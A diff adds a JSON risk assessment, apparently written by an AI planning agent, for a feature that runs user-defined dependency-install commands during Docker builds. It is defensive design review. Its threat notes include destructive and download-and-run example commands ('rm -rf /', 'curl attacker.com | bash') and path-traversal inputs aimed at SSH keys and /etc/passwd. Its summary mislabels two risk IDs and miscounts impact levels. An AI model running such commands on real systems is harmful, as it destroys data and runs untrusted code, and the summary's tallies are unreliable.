@@ -1,0 +1,354 @@
+{
+  "issue": 904,
+  "phase": "plan",
+  "agent": "risk_analyst",
+  "revision": 1,
+  "revision_reason": null,
+  "title": "Risk assessment: Build-time dependency installation via build_commands",
+
+  "summary": "The proposed build_commands feature (Approach A — extending docker-setup.py) is low-to-medium overall risk. The design naturally extends existing patterns and the Docker layer caching approach is sound. Key risks center on: (1) npm/node_modules semantics where build-time installs don't persist to runtime mounts, (2) shell command injection via build_commands if config validation is weak, (3) config availability during Docker build requiring the manifest approach (DD-6) be executed carefully, and (4) partial failure masking from non-fatal error handling. None are blocking, but several require human review of the implementation to ensure correctness.",
+
+  "architect_approach_assessment": {
+    "recommended_approach": "A",
+    "agreement": true,
+    "rationale": "Approach A is the right choice. It extends established patterns (docker-setup.py already reads config and installs packages), minimizes new code surface area, and avoids over-engineering. Approach B would duplicate config loading. Approach C (dynamic Dockerfile) is over-engineering for the 1-3 repos case and introduces fragility in Dockerfile generation. The architect's recommendation is well-justified.",
+    "disagreements": [],
+    "design_decision_review": [
+      {
+        "id": "DD-1",
+        "assessment": "acceptable",
+        "comment": "Matching repo name to local path by directory name is reasonable for the common case. The architect correctly notes edge cases (same repo name in different orgs) and defers them. Risk R-4 addresses the failure mode when no match is found."
+      },
+      {
+        "id": "DD-2",
+        "assessment": "needs_clarification",
+        "comment": "This is the highest-risk design decision. The statement that 'npm ci installs to /tmp/repo-deps/<repo>/node_modules' is correct but the implication is that those node_modules are lost at runtime when the real repo is mounted over /tmp/repo-deps/. The architect's recommendation of option (b) (warm npm cache) is workable but needs clearer documentation for users. pip install to system site-packages works naturally; npm does not. See risk R-1."
+      },
+      {
+        "id": "DD-3",
+        "assessment": "acceptable_with_caveat",
+        "comment": "Non-fatal default is consistent with existing extra_packages behavior (docker-setup.py:152 uses check=False). However, build_commands are user-defined arbitrary commands, not package manager invocations. A command like 'pip install -r requirements.txt' failing silently means the user gets a container with missing dependencies and no clear error signal. Recommend adding explicit warning output with the failing command and exit code. See risk R-5."
+      },
+      {
+        "id": "DD-4",
+        "assessment": "acceptable",
+        "comment": "Placement after Python deps layer (line 104) and before Claude commands COPY (line 111) is correct. Python, pip, and any extra_packages-installed runtimes (Node, Go) will be available. Layer caching is preserved for the frequently-changing layers below."
+      },
+      {
+        "id": "DD-5",
+        "assessment": "superseded_by_DD6",
+        "comment": "DD-5 correctly identifies the problem (config not available during build) and DD-6 provides the solution (build-commands.json manifest). The manifest approach is sound."
+      },
+      {
+        "id": "DD-6",
+        "assessment": "acceptable",
+        "comment": "Writing a build-commands.json manifest is the right approach. It avoids copying the full repositories.yaml (which may contain sensitive data) into the build context. The manifest should include only repo names, watch_files paths, and commands. See risk R-3 for security considerations around manifest content."
+      }
+    ]
+  },
+
+  "risks": [
+    {
+      "id": "R-1",
+      "title": "npm/node_modules artifacts lost at runtime mount",
+      "type": "correctness",
+      "description": "When npm ci runs during build in /tmp/repo-deps/<repo>/, it creates node_modules/ in that directory. At runtime, the real repo is mounted at ~/repos/<repo>/ — a completely different path. The build-time node_modules is unreachable. Unlike pip (which installs to system site-packages), npm installs are directory-local. The architect proposes 'warming the npm cache' (OQ-1, option b), but this requires that (1) npm ci actually populates a persistent cache at build time, and (2) the user runs npm ci again at runtime. In private mode, runtime npm ci fails because there's no network access — the npm cache alone is insufficient if npm tries to verify against the registry.",
+      "affected_files": ["sandbox/docker-setup.py"],
+      "affected_tasks": ["task-4"],
+      "likelihood": "medium",
+      "impact": "high",
+      "status": "NEW",
+      "mitigation": "Document clearly that npm ci in build_commands warms the npm cache but does NOT produce a usable node_modules at runtime. For private mode, users must either: (a) use npm ci --prefer-offline at runtime (which reads from cache without network verification), (b) install npm packages globally via 'npm install -g <pkg>' in build_commands, or (c) set npm config to offline mode. Add a note in documentation that pip-based dependencies 'just work' but npm requires additional configuration. Consider adding an npm-specific example in repositories.yaml.example showing the --prefer-offline pattern.",
+      "rollback": "Remove build_commands config for the affected repo; npm behavior returns to baseline.",
+      "verification": "Test: configure build_commands with 'npm ci' for a Node project, build image, start container in private mode, verify npm packages are available (either via cache or global install).",
+      "human_review_needed": true
+    },
+    {
+      "id": "R-2",
+      "title": "Arbitrary command execution via build_commands",
+      "type": "security",
+      "description": "build_commands allows users to specify arbitrary shell commands that run as root during Docker build. While the architect notes this is similar to extra_packages (which also takes user input), there's a key difference: extra_packages passes values as arguments to apt/dnf (using subprocess list form, no shell injection), while build_commands runs arbitrary strings. If commands are executed via subprocess with shell=True, malicious or accidental shell metacharacters could cause unintended behavior. Even with shell=False, commands like 'rm -rf /' or 'curl attacker.com | bash' would execute.",
+      "affected_files": ["sandbox/docker-setup.py"],
+      "affected_tasks": ["task-4"],
+      "likelihood": "very_low",
+      "impact": "medium",
+      "status": "ACCEPTED",
+      "mitigation": "The config file (repositories.yaml) is a trusted, user-controlled file on the host — same trust model as the Dockerfile itself. The risk is equivalent to the user writing their own Dockerfile layers. No additional validation needed beyond what the user explicitly configures. However, the implementation MUST use subprocess with shell=True for build commands (since commands like 'pip install -r requirements.txt' need shell parsing) — document that these commands run as root in the build container and users are responsible for command safety. The build container has no access to host secrets beyond the config file itself.",
+      "rollback": "N/A — user controls their own config.",
+      "verification": "Code review: verify build commands are executed via subprocess.run() with appropriate shell flag. Verify no host secrets are leaked into the build environment beyond what's already available.",
+      "human_review_needed": false
+    },
+    {
+      "id": "R-3",
+      "title": "Sensitive data leakage via build-commands.json manifest",
+      "type": "security",
+      "description": "DD-6 proposes writing a build-commands.json manifest to the build context. If the manifest generation code accidentally includes fields beyond repo names, watch_files, and commands (e.g., tokens, auth settings, or other repo_settings fields), sensitive data could be baked into Docker image layers. Docker image layers are persistent and inspectable.",
+      "affected_files": ["sandbox/egg_lib/docker.py"],
+      "affected_tasks": ["task-2"],
+      "likelihood": "low",
+      "impact": "high",
+      "status": "NEW",
+      "mitigation": "The manifest generation code in create_dockerfile() must construct the manifest by explicitly selecting only the required fields (repo name, watch_files list, commands list) rather than serializing the entire repo_settings dict. Use an allowlist approach, not a denylist. Add a code comment explaining why this is security-critical. The manifest file should be deleted after the build layer completes (similar to how docker-setup.py is deleted at line 63 of the Dockerfile).",
+      "rollback": "If sensitive data is found in an image, rebuild without the manifest. No deployed images exist (this is a development-time feature).",
+      "verification": "Code review: verify manifest generation uses explicit field selection. Test: build an image, inspect layers (docker history / docker save) to confirm no sensitive config data is present.",
+      "human_review_needed": true
+    },
+    {
+      "id": "R-4",
+      "title": "Repo name to local path resolution may fail silently",
+      "type": "correctness",
+      "description": "DD-1 maps repo names (e.g., 'your-org/web-app') to local paths by matching the directory name part. If local_repos.paths contains paths like /home/user/projects/my-web-app (name doesn't match 'web-app'), the resolution fails and the repo's watch files are silently skipped. The user gets no build_commands executed for that repo, with only a warning in build output that's easy to miss. This is especially problematic for repos with non-standard local directory names.",
+      "affected_files": ["sandbox/egg_lib/docker.py"],
+      "affected_tasks": ["task-2"],
+      "likelihood": "low",
+      "impact": "medium",
+      "status": "NEW",
+      "mitigation": "When a repo in repo_settings has build_commands but no matching local path is found, emit a prominent warning (not just a debug log) that includes the repo name and the list of local paths searched. Consider supporting an explicit local_path override in repo_settings for non-standard cases. At minimum, document the naming requirement clearly in repositories.yaml.example.",
+      "rollback": "N/A — this is a UX issue, not a data corruption risk.",
+      "verification": "Test: configure build_commands for a repo whose local directory name doesn't match the repo name. Verify a clear warning is emitted.",
+      "human_review_needed": false
+    },
+    {
+      "id": "R-5",
+      "title": "Silent failure of build commands masks missing dependencies",
+      "type": "operational",
+      "description": "DD-3 specifies non-fatal build command failures (matching extra_packages' check=False pattern). However, extra_packages failing means a single apt package wasn't installed — often non-critical. Build commands failing means an entire project's dependency tree is missing. A silently failed 'pip install -r requirements.txt' means the container starts but every import fails at runtime, with no clear connection back to the build failure. The existing docker-setup.py pattern at line 152 (check=False) is appropriate for OS packages but too lenient for project dependencies.",
+      "affected_files": ["sandbox/docker-setup.py"],
+      "affected_tasks": ["task-4"],
+      "likelihood": "medium",
+      "impact": "medium",
+      "status": "NEW",
+      "mitigation": "Log build command failures prominently with the full command, exit code, and stderr output. Consider a two-tier approach: (1) default to non-fatal (matching existing pattern), but (2) add a 'strict' option per-repo in build_commands config that makes failures fatal. At minimum, the build output should include a clear summary at the end listing all failed commands so users can diagnose issues. Example: '=== WARNING: 1 of 3 build commands failed for repo web-app ==='.",
+      "rollback": "N/A — error handling is a UX improvement.",
+      "verification": "Test: configure a build command that intentionally fails (e.g., 'pip install nonexistent-package-xyz'). Verify the warning is visible in build output and the container still starts.",
+      "human_review_needed": false
+    },
+    {
+      "id": "R-6",
+      "title": "Watch file paths may reference files outside the repo directory",
+      "type": "security",
+      "description": "watch_files are user-specified relative paths that get resolved against local_repos.paths entries. If a user (accidentally or intentionally) specifies a path like '../../.ssh/id_rsa' or '/etc/passwd', the create_dockerfile() code could copy arbitrary host files into the Docker build context. These files become part of the Docker image layers and persist.",
+      "affected_files": ["sandbox/egg_lib/docker.py"],
+      "affected_tasks": ["task-2"],
+      "likelihood": "very_low",
+      "impact": "high",
+      "status": "NEW",
+      "mitigation": "Validate that all watch_files paths, after resolution, remain within the repo's local directory (use Path.resolve() and check that the resolved path starts with the repo base path). Reject any path that escapes the repo directory with a clear error message. This is a standard path traversal prevention pattern.",
+      "rollback": "If an image was built with escaped paths, rebuild without the offending config.",
+      "verification": "Test: configure watch_files with '../../../etc/passwd'. Verify the path is rejected with a clear error and the file is NOT copied to the build context.",
+      "human_review_needed": true
+    },
+    {
+      "id": "R-7",
+      "title": "Build hash may not cover all rebuild-triggering inputs",
+      "type": "correctness",
+      "description": "compute_build_hash() (docker.py:417-488) currently hashes sandbox files, runtime dirs, and shared modules. Task-3 extends it to include watch file contents and build_commands config. However, the build hash does NOT include: (1) the repositories.yaml file itself (so adding a new repo's build_commands doesn't trigger rebuild unless watch files change), (2) the generated build-commands.json manifest. If only the commands list changes (e.g., 'pip install -r requirements.txt' → 'pip install -r requirements.txt -r dev-requirements.txt') but watch files stay the same, the hash may not change and the rebuild won't trigger.",
+      "affected_files": ["sandbox/egg_lib/docker.py"],
+      "affected_tasks": ["task-3"],
+      "likelihood": "medium",
+      "impact": "medium",
+      "status": "NEW",
+      "mitigation": "The architect's task-3 description says 'hash the build_commands configuration itself (serialized as JSON)'. This must be implemented — hash the full build_commands config (commands + watch_files lists) as a JSON string, not just the watch file contents. Verify that the hash changes when: (a) watch file contents change, (b) commands list changes, (c) a new repo's build_commands is added, (d) watch_files list changes (new files added). Write explicit tests for each of these cases.",
+      "rollback": "Users can force rebuild with --rebuild flag (existing mechanism).",
+      "verification": "Test: change only the commands list (not watch files), verify build hash changes. Test: add a new repo to build_commands, verify hash changes.",
+      "human_review_needed": false
+    },
+    {
+      "id": "R-8",
+      "title": "Runtime-installed runtimes may not be available for build commands",
+      "type": "compatibility",
+      "description": "Build commands like 'npm ci' require Node.js to be installed. Node.js is NOT in the base image — it must be installed via docker_setup.extra_packages.apt (e.g., 'nodejs'). The Dockerfile layer order is: base packages → docker-setup.py (extra_packages) → Python deps → [NEW: build_commands layer]. If Node.js is in extra_packages and build_commands uses npm, this works. But if Node.js is NOT in extra_packages and the user expects it from the base image, build commands will fail. Similarly, Go modules require Go to be installed first.",
+      "affected_files": ["sandbox/Dockerfile", "sandbox/docker-setup.py"],
+      "affected_tasks": ["task-4", "task-5"],
+      "likelihood": "medium",
+      "impact": "medium",
+      "status": "NEW",
+      "mitigation": "Document clearly that build_commands run AFTER docker_setup.extra_packages, so runtimes must be in extra_packages for build commands to use them. Add examples showing the dependency: 'To use npm ci in build_commands, add nodejs to docker_setup.extra_packages.apt first.' Consider adding a validation step that checks if build commands reference common tools (npm, go, cargo, etc.) and warns if those tools aren't in extra_packages.",
+      "rollback": "N/A — documentation and validation improvement.",
+      "verification": "Test: configure build_commands with 'npm ci' but without nodejs in extra_packages. Verify a clear error or warning is produced.",
+      "human_review_needed": false
+    },
+    {
+      "id": "R-9",
+      "title": "Docker build context size growth from large watch files",
+      "type": "performance",
+      "description": "Watch files are copied into the Docker build context (~/.cache/egg/). For most projects, watch files (package-lock.json, requirements.txt) are small. However, some projects have very large lockfiles (yarn.lock can be 500KB+, package-lock.json can be several MB, Go sum files can be large). If many repos are configured, the cumulative build context size could increase meaningfully, slowing down docker build's initial context transfer.",
+      "affected_files": ["sandbox/egg_lib/docker.py"],
+      "affected_tasks": ["task-2"],
+      "likelihood": "low",
+      "impact": "low",
+      "status": "ACCEPTED",
+      "mitigation": "Not a significant concern for the typical 1-3 repos case. Even large lockfiles are small compared to the existing build context (which includes all of sandbox/, shared/, runtime dirs). Monitor if users report slow builds after enabling build_commands. If needed, add a .dockerignore-like mechanism later.",
+      "rollback": "Remove repos from build_commands config to reduce context size.",
+      "verification": "Test: configure build_commands with a repo that has a large (>1MB) package-lock.json. Measure build context transfer time.",
+      "human_review_needed": false
+    },
+    {
+      "id": "R-10",
+      "title": "Concurrent egg instances may race on build context writes",
+      "type": "implementation",
+      "description": "create_dockerfile() already handles race conditions for claude-commands and claude-rules via _copy_directory_atomic(). The new watch file copying logic must also handle concurrent egg instances (e.g., multiple egg --exec calls) that may write to ~/.cache/egg/repo-deps/ simultaneously. If one instance is copying watch files while another starts docker build, the build context could be in an inconsistent state.",
+      "affected_files": ["sandbox/egg_lib/docker.py"],
+      "affected_tasks": ["task-2"],
+      "likelihood": "low",
+      "impact": "medium",
+      "status": "NEW",
+      "mitigation": "Use the existing _copy_directory_atomic() pattern for the repo-deps/ directory. This function already handles race conditions via temp directories and atomic renames with retry logic. The new watch file copying code should use this same function rather than raw shutil.copy().",
+      "rollback": "N/A — following existing pattern eliminates the race.",
+      "verification": "Code review: verify watch file copying uses _copy_directory_atomic() or equivalent atomic copy pattern.",
+      "human_review_needed": false
+    },
+    {
+      "id": "R-11",
+      "title": "Build commands may need network access that isn't available",
+      "type": "compatibility",
+      "description": "Build commands like 'pip install' and 'npm ci' require network access to download packages. Docker build runs with the host's network by default, so this works in public mode. However, if the Docker daemon is configured with restricted networking (e.g., corporate proxy, VPN-only registries), build commands may fail. This is distinct from private mode (which is runtime-only) — build time always has host network. But users may not realize build commands have different network constraints than runtime.",
+      "affected_files": ["sandbox/docker-setup.py"],
+      "affected_tasks": ["task-4"],
+      "likelihood": "low",
+      "impact": "low",
+      "status": "ACCEPTED",
+      "mitigation": "Document that build commands run during docker build with the host's network configuration. If the host can access package registries, build commands work. If not, configure Docker's proxy settings or pre-populate package caches. This is standard Docker build behavior and doesn't need special handling.",
+      "rollback": "N/A.",
+      "verification": "N/A — standard Docker behavior.",
+      "human_review_needed": false
+    },
+    {
+      "id": "R-12",
+      "title": "Missing watch file causes silent skip instead of informative error",
+      "type": "correctness",
+      "description": "The architect notes (task-2 design_notes): 'Handle missing watch files gracefully (warn but don't fail)'. If a user specifies 'package-lock.json' in watch_files but the file doesn't exist in the local repo (e.g., it was gitignored, or the repo was freshly cloned without npm install), the file is silently skipped. The build command (npm ci) then runs without the lockfile and may produce different results than expected, or fail.",
+      "affected_files": ["sandbox/egg_lib/docker.py"],
+      "affected_tasks": ["task-2"],
+      "likelihood": "low",
+      "impact": "medium",
+      "status": "NEW",
+      "mitigation": "When a watch file is missing, emit a clear warning that includes the file name and the repo path. If ALL watch files for a repo are missing, skip that repo's build commands entirely and warn that no dependency files were found. This prevents running commands in an empty directory.",
+      "rollback": "N/A — UX improvement.",
+      "verification": "Test: configure watch_files with a file that doesn't exist in the local repo. Verify a clear warning is produced.",
+      "human_review_needed": false
+    }
+  ],
+
+  "cross_cutting_concerns": [
+    {
+      "id": "CC-1",
+      "title": "npm vs pip asymmetry in user experience",
+      "description": "The build_commands feature works seamlessly for pip-based Python projects (packages install to system site-packages, available everywhere) but has a significant UX gap for npm-based Node projects (node_modules is directory-local and lost when the runtime mount overlays the build directory). This asymmetry means the feature is primarily useful for Python projects out of the box, while Node projects require workarounds. The documentation must be very clear about this to avoid user frustration.",
+      "affected_risks": ["R-1", "R-8"],
+      "recommendation": "Invest in clear documentation and examples for both Python and Node workflows. Consider whether a post-mount hook (run at container startup after repos are mounted) would be a better pattern for Node projects, potentially as a future enhancement."
+    },
+    {
+      "id": "CC-2",
+      "title": "Config validation gap",
+      "description": "The current codebase has minimal config validation — docker-setup.py's load_config() returns an empty dict on failure, and get_extra_packages() silently handles missing keys. Adding build_commands extends this pattern, meaning malformed YAML (e.g., commands as a string instead of a list, watch_files with integer entries) will cause runtime errors during build rather than clear validation errors at config load time.",
+      "affected_risks": ["R-5", "R-12"],
+      "recommendation": "Add basic type checking in get_repo_build_commands(): verify watch_files is a list of strings and commands is a list of strings. Emit clear errors for type mismatches. This doesn't require a full schema validation library — simple isinstance checks suffice."
+    },
+    {
+      "id": "CC-3",
+      "title": "Testing strategy gap for Docker build integration",
+      "description": "The architect's testing strategy includes unit tests (config parsing, hash computation) and integration tests (full build with build_commands). However, the integration tests require actually running docker build, which is slow and environment-dependent. The unit tests can verify config parsing and hash behavior, but the actual Docker layer caching and command execution can only be verified by building an image. There's no existing infrastructure for Docker build integration tests.",
+      "affected_risks": ["R-1", "R-7", "R-8"],
+      "recommendation": "Focus unit tests on config parsing, path validation, manifest generation, and hash computation. For Docker integration, rely on manual testing during development and document the manual test plan clearly in the PR. Consider adding a CI job later if build_commands becomes widely used."
+    }
+  ],
+
+  "rollback_plan": {
+    "strategy": "feature_flag_via_config",
+    "description": "The build_commands feature is entirely opt-in via repositories.yaml config. Rollback is removing the build_commands section from repo_settings. Since all changes are additive (new config fields, new Dockerfile layer, extended docker-setup.py), removing the config returns to baseline behavior. No data migration or state cleanup needed.",
+    "steps": [
+      "Remove build_commands from all repo_settings in repositories.yaml",
+      "Rebuild image with --rebuild flag to ensure clean state",
+      "If code changes need reverting, revert the PR and rebuild"
+    ],
+    "risk_of_rollback": "None — the feature is purely additive and config-gated"
+  },
+
+  "human_review_areas": {
+    "blocking": [
+      {
+        "area": "Path traversal prevention in watch_files (R-6)",
+        "reason": "Security-critical: watch_files paths must be validated to stay within the repo directory. Implementation must use Path.resolve() and verify containment. A path traversal bug could leak host files into Docker image layers."
+      },
+      {
+        "area": "Manifest content filtering (R-3)",
+        "reason": "Security-critical: the build-commands.json manifest must use explicit field allowlisting to avoid leaking sensitive config data into Docker image layers. Review the manifest generation code carefully."
+      }
+    ],
+    "non_blocking": [
+      {
+        "area": "npm/node_modules UX documentation (R-1, CC-1)",
+        "reason": "The pip vs npm asymmetry needs clear documentation. Review the examples and usage notes for Node projects to ensure they don't promise more than the feature delivers."
+      },
+      {
+        "area": "Build hash completeness (R-7)",
+        "reason": "Verify that the build hash includes both watch file contents AND the build_commands config (commands list, watch_files list). Missing either means users must manually --rebuild."
+      },
+      {
+        "area": "Error output quality for failed build commands (R-5)",
+        "reason": "Review the error handling in install_build_commands() to ensure failures are visible in build output. Silent failures will cause user frustration."
+      }
+    ]
+  },
+
+  "risk_summary": {
+    "overall_risk": "LOW-MEDIUM",
+    "counts": {
+      "critical": 0,
+      "high_impact": 3,
+      "medium_impact": 6,
+      "low_impact": 3,
+      "mitigated_in_plan": 0,
+      "new_requiring_attention": 9,
+      "accepted": 3,
+      "blocking_human_review": 2
+    },
+    "justification": "The feature extends existing, well-understood patterns (docker-setup.py, compute_build_hash, create_dockerfile). No architectural risks — the design is sound and the recommended approach (A) is minimal. The two blocking risks (R-3 path traversal, R-6 manifest filtering) are standard security patterns that any senior engineer will implement correctly but should be explicitly reviewed. The npm UX gap (R-1) is the most impactful functional risk but is a documentation/expectation issue rather than a correctness bug. Overall, this is a well-scoped feature with manageable risks."
+  },
+
+  "implementation_recommendations": [
+    {
+      "id": "IR-1",
+      "recommendation": "Use Path.resolve() containment check for all watch_files paths before copying to build context. Pattern: resolved_path.is_relative_to(repo_base_path).",
+      "affected_risks": ["R-6"],
+      "priority": "high"
+    },
+    {
+      "id": "IR-2",
+      "recommendation": "Generate build-commands.json manifest with explicit field selection: {repo_name, watch_files, commands} only. Do not serialize the full repo_settings entry.",
+      "affected_risks": ["R-3"],
+      "priority": "high"
+    },
+    {
+      "id": "IR-3",
+      "recommendation": "Hash the serialized build_commands config (JSON of all repos' commands + watch_files lists) in addition to watch file contents. Test that hash changes when commands change even if watch files don't.",
+      "affected_risks": ["R-7"],
+      "priority": "medium"
+    },
+    {
+      "id": "IR-4",
+      "recommendation": "Add clear npm-specific examples in repositories.yaml.example showing that build_commands warms the cache but node_modules requires runtime setup. Consider documenting the --prefer-offline pattern.",
+      "affected_risks": ["R-1"],
+      "priority": "medium"
+    },
+    {
+      "id": "IR-5",
+      "recommendation": "Use _copy_directory_atomic() or equivalent atomic pattern for watch file copying to handle concurrent egg instances.",
+      "affected_risks": ["R-10"],
+      "priority": "medium"
+    },
+    {
+      "id": "IR-6",
+      "recommendation": "Add isinstance validation in get_repo_build_commands(): verify watch_files is list[str] and commands is list[str]. Emit clear errors for type mismatches.",
+      "affected_risks": ["R-5"],
+      "priority": "low"
+    },
+    {
+      "id": "IR-7",
+      "recommendation": "When all watch_files for a repo are missing, skip that repo's build commands entirely and emit a prominent warning.",
+      "affected_risks": ["R-12"],
+      "priority": "low"
+    }
+  ]
+}
